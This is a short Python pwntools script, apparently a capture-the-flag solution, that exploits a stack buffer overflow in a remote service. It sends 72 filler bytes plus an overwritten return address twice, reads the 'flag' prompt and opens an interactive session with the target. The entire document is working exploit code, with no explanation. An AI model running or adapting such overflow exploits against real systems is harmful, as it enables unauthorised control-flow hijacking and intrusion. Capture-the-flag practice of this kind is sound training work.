from pwn import *

#r = process('./vuln')
r = remote('124.16.75.117',51002)

payload = "A" * 72
payload += p64(0x4007e8)

#print(r.recvline())
#r.sendline("cheer")

#r.recvuntil("choice:>>\n")
#r.sendline("1")

#r.recvuntil("your note: \n")
print(r.recvuntil("gets you the flag: \n"))
r.sendline(payload)

print(r.recvuntil("gets you the flag: \n"))
payload = "A" * 72
payload += p64(0x400767)
r.sendline(payload)
print(r.recvall())

r.interactive()